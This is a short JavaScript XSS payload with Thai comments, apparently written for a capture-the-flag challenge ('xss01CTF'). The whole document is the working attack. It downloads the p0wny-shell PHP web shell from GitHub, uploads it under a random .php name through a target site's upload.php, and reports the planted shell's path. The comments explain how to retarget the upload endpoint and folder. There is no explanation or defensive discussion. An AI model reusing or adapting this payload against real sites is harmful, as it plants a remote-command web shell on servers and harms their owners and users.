<script>
(function () {

  function randomName(len = 5) {
    return 'file_' + Math.random().toString(36).substr(2, len) + '.php';
  }

  const filename = randomName();

  fetch('https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php')
    .then(r => r.text())
    .then(code => {
      const form = new FormData();
      form.append(
        'file',
        new Blob([code], { type: 'application/x-php' }),
        filename
      );
      return fetch('/xss01/upload.php', {
        method: 'POST',
        body: form
      });
    }) //สามารถเปลี่ยน Part เป้าหมายของไฟล์ upload.php ได้ เช่น /xss01CTF/upload.php
    .then(() => {
      alert('Shell uploaded: /upload/' + filename);
    }); //สามารถเปลี่ยน Part เป้าหมายของโฟเดอร์ ีuploadได้ เช่น /xss01CTF/upload/

})();
</script>
